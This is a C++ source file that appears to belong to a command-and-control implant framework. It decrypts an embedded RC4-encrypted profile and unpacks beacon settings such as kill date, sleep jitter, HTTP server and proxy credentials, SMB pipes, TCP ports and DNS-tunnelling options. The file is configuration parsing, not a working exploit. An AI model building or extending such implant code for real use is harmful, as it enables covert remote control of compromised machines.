#include "AgentConfig.h"
#include "Packer.h"
#include "Crypt.h"
#include "utils.h"
#include "config.h"

void* AgentConfig::operator new(size_t sz) 
{
	void* p = MemAllocLocal(sz);
	return p;
}

void AgentConfig::operator delete(void* p) noexcept 
{
	MemFreeLocal(&p, sizeof(AgentConfig));
}

AgentConfig::AgentConfig()
{
	ULONG length       = 0;
	ULONG size         = getProfileSize();
	CHAR* ProfileBytes = (CHAR*) MemAllocLocal(size);
	memcpy(ProfileBytes, getProfile(), size);

	Packer* packer = new Packer((BYTE*)ProfileBytes, size);
	ULONG profileSize = packer->Unpack32();

	this->encrypt_key = (PBYTE) MemAllocLocal(16);
	memcpy(this->encrypt_key, packer->data() + 4 + profileSize, 16);

	DecryptRC4(packer->data()+4, profileSize, this->encrypt_key, 16);
	
	this->agent_type   = packer->Unpack32();
	this->kill_date    = packer->Unpack32();
	this->working_time = packer->Unpack32();
	this->sleep_delay  = packer->Unpack32();
	this->jitter_delay = packer->Unpack32();

#if defined(BEACON_HTTP)
	this->listener_type = packer->Unpack32();

	this->profile.use_ssl        = packer->Unpack8();
	this->profile.servers_count  = packer->Unpack32();
	this->profile.servers        = (BYTE**) MemAllocLocal(this->profile.servers_count * sizeof(LPVOID) );
	this->profile.ports          = (WORD*)  MemAllocLocal(this->profile.servers_count * sizeof(WORD) );
	for (int i = 0; i < this->profile.servers_count; i++) {
		this->profile.servers[i] = packer->UnpackBytesCopy(&length);
		this->profile.ports[i]   = (WORD) packer->Unpack32();
	}
	this->profile.http_method = packer->UnpackBytesCopy(&length);
	this->profile.uri_count   = packer->Unpack32();
	this->profile.uris        = (BYTE**)MemAllocLocal(this->profile.uri_count * sizeof(LPVOID));
	for (ULONG i = 0; i < this->profile.uri_count; i++) {
		this->profile.uris[i] = packer->UnpackBytesCopy(&length);
	}
	this->profile.parameter   = packer->UnpackBytesCopy(&length);
	this->profile.ua_count    = packer->Unpack32();
	this->profile.user_agents = (BYTE**)MemAllocLocal(this->profile.ua_count * sizeof(LPVOID));
	for (ULONG i = 0; i < this->profile.ua_count; i++) {
		this->profile.user_agents[i] = packer->UnpackBytesCopy(&length);
	}
	this->profile.http_headers = packer->UnpackBytesCopy(&length);
	this->profile.ans_pre_size = packer->Unpack32();
	this->profile.ans_size     = packer->Unpack32() + this->profile.ans_pre_size;
	this->profile.hh_count     = packer->Unpack32();
	this->profile.host_headers = (BYTE**)MemAllocLocal(this->profile.hh_count * sizeof(LPVOID));
	for (ULONG i = 0; i < this->profile.hh_count; i++) {
		this->profile.host_headers[i] = packer->UnpackBytesCopy(&length);
	}
	this->profile.rotation_mode  = (BYTE) packer->Unpack32();
	this->profile.proxy_type     = (BYTE) packer->Unpack32();
	this->profile.proxy_host     = packer->UnpackBytesCopy(&length);
	this->profile.proxy_port     = (WORD) packer->Unpack32();
	this->profile.proxy_username = packer->UnpackBytesCopy(&length);
	this->profile.proxy_password = packer->UnpackBytesCopy(&length);

#elif defined(BEACON_SMB)
	this->listener_type    = packer->Unpack32();
	this->profile.pipename = packer->UnpackBytesCopy(&length);

#elif defined(BEACON_TCP)
	this->listener_type   = packer->Unpack32();
	this->profile.prepend = packer->UnpackBytesCopy(&length);
	this->profile.port    = packer->Unpack32();

#elif defined(BEACON_DNS)
	this->listener_type         = packer->Unpack32();
	this->profile.domain        = packer->UnpackBytesCopy(&length);
	this->profile.resolvers     = packer->UnpackBytesCopy(&length);
	this->profile.doh_resolvers = packer->UnpackBytesCopy(&length);
	this->profile.qtype         = packer->UnpackBytesCopy(&length);
	this->profile.pkt_size      = packer->Unpack32();
	this->profile.label_size    = packer->Unpack32();
	this->profile.ttl           = packer->Unpack32();
	this->profile.encrypt_key   = this->encrypt_key;
	this->profile.burst_enabled = packer->Unpack32();
	this->profile.burst_sleep   = packer->Unpack32();
	this->profile.burst_jitter  = packer->Unpack32();
	this->profile.dns_mode      = packer->Unpack32();
	this->profile.user_agent    = packer->UnpackBytesCopy(&length);
#endif

#if defined(BEACON_DNS)
	this->download_chunk_size = 0x8000; // 32 KB
#else
	this->download_chunk_size = 0x19000; // ~100KB 
#endif

	delete packer;
	MemFreeLocal((LPVOID*)&ProfileBytes, size);
}